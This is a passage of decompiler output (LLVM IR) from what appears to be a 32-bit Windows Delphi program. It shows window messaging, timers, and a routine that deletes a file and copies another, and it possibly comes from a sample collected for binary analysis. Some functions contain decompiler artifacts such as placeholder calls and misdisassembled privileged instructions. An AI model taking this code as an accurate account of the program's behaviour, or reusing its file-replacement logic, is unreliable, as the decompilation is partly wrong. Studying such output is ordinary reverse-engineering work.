  %37 = add i32 %26, 20, !insn.addr !1384
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1385
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1386
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1387
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1388
  %42 = call i32 @function_407458(i32 4219324, i32 2000, i32 -1), !insn.addr !1389
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1390
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1390
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1391
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1391
  %46 = icmp eq i1 %45, false, !insn.addr !1392
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1393
  br i1 %46, label %dec_label_pc_4061a6, label %dec_label_pc_406197, !insn.addr !1393

dec_label_pc_406197:                              ; preds = %dec_label_pc_40612d
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1394
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1394
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1395
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1395
  br label %dec_label_pc_4061a6, !insn.addr !1395

dec_label_pc_4061a6:                              ; preds = %dec_label_pc_406197, %dec_label_pc_40612d, %dec_label_pc_406125, %dec_label_pc_4060fa, %dec_label_pc_4060d1, %dec_label_pc_4060b6, %dec_label_pc_40609c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1396
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1396
  %51 = load i32, i32* %50, align 4, !insn.addr !1396
  ret i32 %51, !insn.addr !1397
}

define i32 @function_4061b1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4061b1:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1398
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1398
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1398
  store i8 %6, i8* %7, align 1, !insn.addr !1398
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1399
  %10 = udiv i32 %4, 256, !insn.addr !1399
  %11 = trunc i32 %10 to i8, !insn.addr !1399
  %12 = add i8 %9, %11, !insn.addr !1399
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1399
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1399
  store i8 %12, i8* %14, align 1, !insn.addr !1399
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1400
  %17 = add i32 %4, 6, !insn.addr !1400
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1400
  %19 = zext i1 %16 to i32, !insn.addr !1400
  %20 = and i32 %4, -65536, !insn.addr !1400
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1401
  %23 = or i1 %16, %22, !insn.addr !1401
  %24 = add i32 %18, 6, !insn.addr !1401
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1401
  %26 = zext i1 %23 to i32, !insn.addr !1401
  %27 = and i32 %25, 15, !insn.addr !1401
  %28 = or i32 %27, %20, !insn.addr !1401
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1401
  %31 = or i32 %28, %30, !insn.addr !1401
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1402
  %33 = load i8, i8* %32, align 1, !insn.addr !1402
  %34 = trunc i32 %27 to i8, !insn.addr !1402
  %35 = xor i8 %33, %34, !insn.addr !1402
  store i8 %35, i8* %32, align 1, !insn.addr !1402
  %36 = add i32 %0, 1311123697, !insn.addr !1403
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1403
  %38 = load i8, i8* %37, align 1, !insn.addr !1403
  %39 = udiv i32 %3, 256, !insn.addr !1403
  %40 = trunc i32 %39 to i8, !insn.addr !1403
  %41 = add i8 %38, %40, !insn.addr !1403
  store i8 %41, i8* %37, align 1, !insn.addr !1403
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1404
  %43 = load i32, i32* %42, align 4, !insn.addr !1404
  %44 = sub i32 %43, %31, !insn.addr !1404
  store i32 %44, i32* %42, align 4, !insn.addr !1404
  %45 = add i32 %3, 117, !insn.addr !1405
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1405
  %47 = load i8, i8* %46, align 1, !insn.addr !1405
  %48 = add i8 %47, %34, !insn.addr !1405
  %49 = icmp eq i8 %48, 0, !insn.addr !1405
  store i8 %48, i8* %46, align 1, !insn.addr !1405
  br i1 %49, label %dec_label_pc_40623c, label %dec_label_pc_4061c8, !insn.addr !1406

dec_label_pc_4061c8:                              ; preds = %dec_label_pc_4061b1
  %50 = xor i32 %3, %1, !insn.addr !1407
  %51 = trunc i32 %3 to i16, !insn.addr !1408
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1408
  %53 = load i32, i32* %52, align 4, !insn.addr !1408
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1408
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1409
  %55 = load i8, i8* %54, align 1, !insn.addr !1409
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1409
  %56 = load i8, i8* %32, align 1, !insn.addr !1410
  %57 = add i8 %56, %34, !insn.addr !1410
  store i8 %57, i8* %32, align 1, !insn.addr !1410
  %58 = call i32 @__asm_iretd(), !insn.addr !1411
  %59 = add i32 %2, -117, !insn.addr !1412
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1412
  %61 = load i8, i8* %60, align 1, !insn.addr !1412
  %62 = add i8 %61, -69, !insn.addr !1412
  store i8 %62, i8* %60, align 1, !insn.addr !1412
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1413
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1414
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1414
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1414
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1415
  %66 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1416
  %67 = add i32 %66, 1, !insn.addr !1416
  store i32 %67, i32* @global_var_4096c8, align 4, !insn.addr !1416
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1417
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1418
  ret i32 0, !insn.addr !1419

dec_label_pc_40623c:                              ; preds = %dec_label_pc_4061b1
  %69 = call i32 @function_403c90(), !insn.addr !1420
  store i32 %69, i32* %ebx, align 4, !insn.addr !1421
  %70 = icmp slt i32 %69, 0, !insn.addr !1422
  br i1 %70, label %dec_label_pc_406264, label %dec_label_pc_40624c, !insn.addr !1423

dec_label_pc_40624c:                              ; preds = %dec_label_pc_40623c
  %71 = add i32 %69, 1, !insn.addr !1424
  store i32 %71, i32* %ebx, align 4, !insn.addr !1424
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1425
  br label %dec_label_pc_4062a5

dec_label_pc_406264:                              ; preds = %dec_label_pc_40623c
  %73 = call i32 @function_403c88(), !insn.addr !1426
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1427
  %75 = call i32 @function_403c90(), !insn.addr !1428
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1429
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1430
  br label %dec_label_pc_4062a5, !insn.addr !1430

dec_label_pc_4062a5:                              ; preds = %dec_label_pc_40624c, %dec_label_pc_406264
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1431
}

define i32 @function_4062ac() local_unnamed_addr {
dec_label_pc_4062ac:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1432
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1432
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1432
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1433
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1434
  %3 = add i32 %2, 1, !insn.addr !1434
  %4 = icmp eq i32 %3, 0, !insn.addr !1434
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1434
  %5 = icmp eq i1 %4, false, !insn.addr !1435
  br i1 %5, label %dec_label_pc_4062d5, label %dec_label_pc_4062c5, !insn.addr !1435

dec_label_pc_4062c5:                              ; preds = %dec_label_pc_4062ac
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1436
  br label %dec_label_pc_4062d5, !insn.addr !1436

dec_label_pc_4062d5:                              ; preds = %dec_label_pc_4062c5, %dec_label_pc_4062ac
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1437
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1438
  ret i32 0, !insn.addr !1439
}

define i32 @function_4062e3() local_unnamed_addr {
dec_label_pc_4062e3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1440
  ret i32 %0, !insn.addr !1440
}

define i32 @function_4062e8() local_unnamed_addr {
dec_label_pc_4062e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1441
}

define i32 @function_4062ea(i32 %arg1) local_unnamed_addr {
dec_label_pc_4062ea:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1442
}

define i32 @function_4062ec() local_unnamed_addr {
dec_label_pc_4062ec:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1443
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1443
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1443
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1444
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1445
  %3 = add i32 %2, -1, !insn.addr !1445
  %4 = icmp eq i32 %2, 0, !insn.addr !1445
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1445
  %5 = icmp eq i1 %4, false, !insn.addr !1446
  br i1 %5, label %dec_label_pc_406320, label %dec_label_pc_406306, !insn.addr !1446

dec_label_pc_406306:                              ; preds = %dec_label_pc_4062ec
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1447
  br label %dec_label_pc_406320, !insn.addr !1448

dec_label_pc_406320:                              ; preds = %dec_label_pc_406306, %dec_label_pc_4062ec
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1449
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1450
  ret i32 0, !insn.addr !1451
}

define i32 @function_40632e() local_unnamed_addr {
dec_label_pc_40632e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1452
  ret i32 %0, !insn.addr !1452
}

define i32 @function_406333() local_unnamed_addr {
dec_label_pc_406333:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1453
}

define i32 @function_406335(i32 %arg1) local_unnamed_addr {
dec_label_pc_406335:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1454
}

define i32 @function_406338(i32 %arg1) local_unnamed_addr {
dec_label_pc_406338:
  %esp.0.reg2mem = alloca i32, !insn.addr !1455
  %of.0.reg2mem = alloca i1, !insn.addr !1455
  %.reg2mem6 = alloca i8, !insn.addr !1455
  %.reg2mem = alloca i32, !insn.addr !1455
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i1 @__decompiler_undefined_function_1()
  %6 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1455
  %7 = trunc i32 %2 to i8, !insn.addr !1456
  %8 = and i8 %7, 31, !insn.addr !1456
  %9 = icmp eq i8 %8, 0, !insn.addr !1456
  br i1 %9, label %dec_label_pc_406338._crit_edge, label %11, !insn.addr !1456

dec_label_pc_406338._crit_edge:                   ; preds = %dec_label_pc_406338
  %10 = trunc i32 %0 to i8
  store i8 %10, i8* %.reg2mem6
  br label %21

; <label>:11:                                     ; preds = %dec_label_pc_406338
  %12 = add i32 %1, -959064636, !insn.addr !1456
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1456
  %14 = load i8, i8* %13, align 1, !insn.addr !1456
  %15 = shl i8 %14, %8, !insn.addr !1456
  store i8 %15, i8* %13, align 1, !insn.addr !1456
  %16 = add nsw i8 %8, -1, !insn.addr !1456
  %17 = shl i8 %14, %16, !insn.addr !1456
  %.unshifted = xor i8 %15, %17
  %18 = icmp slt i8 %.unshifted, 0, !insn.addr !1456
  %19 = icmp eq i8 %8, 1, !insn.addr !1456
  %20 = select i1 %19, i1 %18, i1 %5, !insn.addr !1456
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  %.pre4 = load i32, i32* %esi, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !1456
  store i8 %.pre, i8* %.reg2mem6, !insn.addr !1456
  store i1 %20, i1* %of.0.reg2mem, !insn.addr !1456
  br label %21, !insn.addr !1456

; <label>:21:                                     ; preds = %dec_label_pc_406338._crit_edge, %11
  %of.0.reload = load i1, i1* %of.0.reg2mem
  %.reload7 = load i8, i8* %.reg2mem6, !insn.addr !1457
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1457
  %22 = zext i8 %.reload7 to i32, !insn.addr !1457
  %23 = and i32 %3, -256, !insn.addr !1457
  %24 = or i32 %23, %22, !insn.addr !1457
  %25 = select i1 %6, i32 -1, i32 1, !insn.addr !1457
  %26 = add i32 %.reload, %25, !insn.addr !1457
  store i32 %26, i32* %esi, align 4, !insn.addr !1457
  %27 = inttoptr i32 %24 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = add i8 %28, %.reload7
  br i1 %of.0.reload, label %dec_label_pc_4063ac, label %dec_label_pc_406343, !insn.addr !1458

dec_label_pc_406343:                              ; preds = %21
  %factor = mul i8 %.reload7, 27
  %30 = add i8 %29, %factor, !insn.addr !1459
  store i8 %30, i8* %27, align 1, !insn.addr !1459
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1460
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !1461
  store i32 %31, i32* %stack_var_-48, align 4, !insn.addr !1461
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1461
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !1462
  %33 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1463
  ret i32 %33, !insn.addr !1463

dec_label_pc_4063ac:                              ; preds = %21
  %34 = icmp eq i8 %29, 0, !insn.addr !1464
  store i8 %29, i8* %27, align 1, !insn.addr !1464
  %35 = icmp eq i1 %34, false, !insn.addr !1465
  br i1 %35, label %dec_label_pc_406460, label %dec_label_pc_4063b4, !insn.addr !1465

dec_label_pc_4063b4:                              ; preds = %dec_label_pc_4063ac
  %36 = call i32 @function_40754c(), !insn.addr !1466
  %37 = call i32 @"@LStrPos"(), !insn.addr !1467
  %38 = call i32 @"@LStrPos"(), !insn.addr !1468
  %39 = add i32 %38, -1, !insn.addr !1469
  %40 = icmp slt i32 %39, 0, !insn.addr !1470
  %41 = add i32 %37, 2, !insn.addr !1471
  %42 = icmp sgt i32 %41, %39, !insn.addr !1472
  %or.cond = or i1 %40, %42
  br i1 %or.cond, label %dec_label_pc_406460, label %dec_label_pc_4063e8, !insn.addr !1473

dec_label_pc_4063e8:                              ; preds = %dec_label_pc_4063b4
  %43 = add i32 %1, -12, !insn.addr !1474
  store i32 %43, i32* %stack_var_-4, align 4, !insn.addr !1475
  %44 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1475
  %45 = call i32 @"@LStrCopy"(), !insn.addr !1476
  %46 = inttoptr i32 %43 to i32*, !insn.addr !1477
  %47 = load i32, i32* %46, align 4, !insn.addr !1477
  %48 = icmp eq i32 %47, 0, !insn.addr !1477
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !1478
  br i1 %48, label %dec_label_pc_406460, label %dec_label_pc_406410, !insn.addr !1478

dec_label_pc_406410:                              ; preds = %dec_label_pc_4063e8
  %49 = call i32 @function_407334(), !insn.addr !1479
  %50 = call i32 @"@LStrFromPChar"(), !insn.addr !1480
  %51 = call i32 @"@LStrCat"(), !insn.addr !1481
  %52 = call i32 @function_4036c8(), !insn.addr !1482
  %53 = inttoptr i32 %52 to i8*, !insn.addr !1483
  %54 = call i1 @DeleteFileA(i8* %53), !insn.addr !1484
  %55 = call i32 @function_4036c8(), !insn.addr !1485
  %56 = inttoptr i32 %55 to i8*, !insn.addr !1486
  store i8* %56, i8** %stack_var_-20, align 4, !insn.addr !1486
  %57 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1486
  %58 = call i1 @CopyFileA(i8* %56, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1487
  %59 = call i32 @function_40609c(), !insn.addr !1488
  store i32 %57, i32* %esp.0.reg2mem, !insn.addr !1488
  br label %dec_label_pc_406460, !insn.addr !1488

dec_label_pc_406460:                              ; preds = %dec_label_pc_406410, %dec_label_pc_4063e8, %dec_label_pc_4063b4, %dec_label_pc_4063ac
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %60 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1489
  %61 = load i32, i32* %60, align 4, !insn.addr !1489
  call void @__writefsdword(i32 0, i32 %61), !insn.addr !1490
  %62 = add i32 %esp.0.reload, 8, !insn.addr !1491
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1491
  store i32 4220034, i32* %63, align 4, !insn.addr !1491
  %64 = call i32 @"@LStrArrayClr"(), !insn.addr !1492
  ret i32 %64, !insn.addr !1493
}

define i32 @function_40647b() local_unnamed_addr {
dec_label_pc_40647b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1494
  ret i32 %0, !insn.addr !1494
}

define i32 @function_406480() local_unnamed_addr {
dec_label_pc_406480:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1495
}

define i32 @function_406482(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406482:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1496
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1496
  %3 = load i32, i32* %2, align 4, !insn.addr !1496
  ret i32 %3, !insn.addr !1497
}

define i32 @function_406493() local_unnamed_addr {
dec_label_pc_406493:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1498
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1498
  store i32 %1, i32* %2, align 4, !insn.addr !1498
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1499
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1499
  %7 = add i8 %4, %6, !insn.addr !1499
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1499
  store i8 %7, i8* %8, align 1, !insn.addr !1499
  %9 = load i32, i32* %eax, align 4, !insn.addr !1500
  ret i32 %9, !insn.addr !1500
}

define i32 @function_4064a2() local_unnamed_addr {
dec_label_pc_4064a2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1501
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1501
  store i8 %4, i8* %5, align 1, !insn.addr !1501
  %6 = mul i32 %0, 4096, !insn.addr !1502
  %7 = udiv i32 %0, 1048576, !insn.addr !1502
  %8 = or i32 %7, %6, !insn.addr !1502
  %9 = and i32 %0, 1048576, !insn.addr !1502
  %10 = icmp eq i32 %9, 0, !insn.addr !1502
  %11 = load i32, i32* %edx, align 4, !insn.addr !1503
  %12 = trunc i32 %11 to i16, !insn.addr !1503
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1503
  %14 = sext i8 %13 to i32, !insn.addr !1503
  %15 = or i32 %2, %14, !insn.addr !1503
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1504
  %17 = and i32 %15, -256, !insn.addr !1504
  %18 = or i32 %17, %16, !insn.addr !1504
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1505
  %20 = load i8, i8* %19, align 1, !insn.addr !1505
  %21 = mul i8 %20, 2, !insn.addr !1505
  %22 = lshr i8 %20, 7, !insn.addr !1505
  %23 = or i8 %22, %21, !insn.addr !1505
  store i8 %23, i8* %19, align 1, !insn.addr !1505
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1506
  %26 = udiv i32 %1, 256, !insn.addr !1506
  %27 = trunc i32 %26 to i8, !insn.addr !1506
  %28 = add i8 %25, %27, !insn.addr !1506
  %29 = load i32, i32* %edx, align 4, !insn.addr !1506
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1506
  store i8 %28, i8* %30, align 1, !insn.addr !1506
  %31 = add i32 %8, -4, !insn.addr !1507
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1507
  store i32 4219772, i32* %32, align 4, !insn.addr !1507
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1508
  %34 = sext i1 %33 to i32, !insn.addr !1508
  ret i32 %34, !insn.addr !1509
}

define i32 @function_4064ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_4064bc() local_unnamed_addr {
dec_label_pc_4064bc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1510
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1510
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1510
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1511
  %2 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1512
  %3 = add i32 %2, 1, !insn.addr !1512
  store i32 %3, i32* @global_var_4096d4, align 4, !insn.addr !1512
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1513
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1514
  ret i32 0, !insn.addr !1515
}

define i32 @function_4064e1() local_unnamed_addr {
dec_label_pc_4064e1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1516
  ret i32 %0, !insn.addr !1516
}

define i32 @function_4064e6() local_unnamed_addr {
dec_label_pc_4064e6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1517
}

define i32 @function_4064e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4064e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1518
}

define i32 @function_4064ec() local_unnamed_addr {
dec_label_pc_4064ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1519
  %2 = add i32 %1, -1, !insn.addr !1519
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1519
  ret i32 %0, !insn.addr !1520
}

define i32 @function_4064f4() local_unnamed_addr {
dec_label_pc_4064f4:
  %eax.0.reg2mem = alloca i32, !insn.addr !1521
  %0 = call i32 @function_406568(), !insn.addr !1522
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1523
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1524
  br i1 %2, label %dec_label_pc_406528, label %dec_label_pc_406506, !insn.addr !1524

dec_label_pc_406506:                              ; preds = %dec_label_pc_4064f4
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1525
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1526
  %5 = load i32, i32* %4, align 4, !insn.addr !1526
  %6 = icmp eq i32 %5, 0, !insn.addr !1526
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1527
  br i1 %6, label %dec_label_pc_406528, label %dec_label_pc_406510, !insn.addr !1527

dec_label_pc_406510:                              ; preds = %dec_label_pc_406506
  call void @PostQuitMessage(i32 66), !insn.addr !1528
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1529
  unreachable, !insn.addr !1529

dec_label_pc_406528:                              ; preds = %dec_label_pc_406506, %dec_label_pc_4064f4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1530
}

define i32 @function_406538() local_unnamed_addr {
dec_label_pc_406538:
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1531
  %1 = icmp eq i32 %0, 0, !insn.addr !1531
  br i1 %1, label %dec_label_pc_406546, label %dec_label_pc_406541, !insn.addr !1532

dec_label_pc_406541:                              ; preds = %dec_label_pc_406538
  %2 = call i32 @function_406568(), !insn.addr !1533
  br label %dec_label_pc_406546, !insn.addr !1533

dec_label_pc_406546:                              ; preds = %dec_label_pc_406541, %dec_label_pc_406538
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1534
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1535
  %5 = load i32, i32* %4, align 4, !insn.addr !1535
  %6 = mul i32 %5, 1000, !insn.addr !1535
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4220148 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1536
  store i32 %7, i32* @global_var_408110, align 4, !insn.addr !1537
  ret i32 %7, !insn.addr !1538
}

define i32 @function_406568() local_unnamed_addr {
dec_label_pc_406568:
  %.reg2mem = alloca i32, !insn.addr !1539
  %0 = load i32, i32* @global_var_408110, align 4, !insn.addr !1539
  %1 = icmp eq i32 %0, 0, !insn.addr !1539
  store i32 %0, i32* %.reg2mem, !insn.addr !1540
  br i1 %1, label %2, label %dec_label_pc_406571, !insn.addr !1540

; <label>:2:                                      ; preds = %dec_label_pc_406568
  %3 = call i32 @function_406585(), !insn.addr !1540
  %.pre = load i32, i32* @global_var_408110, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1540
  br label %dec_label_pc_406571, !insn.addr !1540

dec_label_pc_406571:                              ; preds = %2, %dec_label_pc_406568
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1541
  ret i32 %.reload, !insn.addr !1542
}

define i32 @function_406585() local_unnamed_addr {
dec_label_pc_406585:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1543
}

define i32 @function_406588() local_unnamed_addr {
dec_label_pc_406588:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_4064ac(i32 %0), !insn.addr !1544
  ret i32 %1, !insn.addr !1545
}

define i32 @function_406594() local_unnamed_addr {
dec_label_pc_406594:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1546
  %1 = icmp eq i32 %0, 0, !insn.addr !1546
  br i1 %1, label %dec_label_pc_4065a2, label %dec_label_pc_40659d, !insn.addr !1547

dec_label_pc_40659d:                              ; preds = %dec_label_pc_406594
  %2 = call i32 @function_4065bc(), !insn.addr !1548
  br label %dec_label_pc_4065a2, !insn.addr !1548

dec_label_pc_4065a2:                              ; preds = %dec_label_pc_40659d, %dec_label_pc_406594
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4220296 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1549
  store i32 %3, i32* @global_var_408114, align 4, !insn.addr !1550
  ret i32 %3, !insn.addr !1551
}

define i32 @function_4065bc() local_unnamed_addr {
dec_label_pc_4065bc:
  %0 = load i32, i32* @global_var_408114, align 4, !insn.addr !1552
  ret i32 %0, !insn.addr !1553
}

define i32 @function_4065dc() local_unnamed_addr {
dec_label_pc_4065dc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1554
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1554
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1554
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1555
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1556
  %3 = add i32 %2, 1, !insn.addr !1556
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1556
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1557
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1558
  ret i32 0, !insn.addr !1559
}

define i32 @function_406601() local_unnamed_addr {
dec_label_pc_406601:
